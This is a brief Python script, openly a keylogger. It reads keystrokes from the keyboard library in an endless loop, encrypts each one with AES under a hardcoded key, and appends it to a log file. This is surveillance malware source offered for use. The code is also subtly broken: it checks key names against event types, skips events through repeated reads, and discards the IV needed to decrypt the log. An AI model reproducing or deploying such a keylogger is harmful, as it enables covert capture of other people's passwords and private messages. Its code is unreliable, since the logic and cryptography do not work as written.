import logging
from Crypto.Cipher import AES
from Crypto import Random
import os

key = b'Sixteen byte key'
cipher = AES.new(key, AES.MODE_OFB)

log_file_path = 'encrypted_keylogger.log'

if not os.path.exists(log_file_path):
    with open(log_file_path, 'wb') as log_file:
        pass  # Create an empty file

logging.basicConfig(
    filename=log_file_path,
    level=logging.DEBUG,
    format='%(message)s'
)


def encrypt_data(data):
    """Encrypts the input data using AES."""
    return cipher.encrypt(data.encode())


def on_key_press(key):
    """Logs every key press to a file in encrypted form."""
    logging.info('Key Pressed: {}'.format(encrypt_data(key)))


import keyboard

while True:
    try:
        event_name = keyboard.read_event().name
        if event_name == "down":
            on_key_press(keyboard.read_event().name)
        elif event_name == "up":  # Optionally you can also track key releases
            logging.info('Key Released: {}'.format(encrypt_data(keyboard.read_event().name)))
    except Exception as e:
        logging.error(f"Unexpected error occurred: {e}")
        break
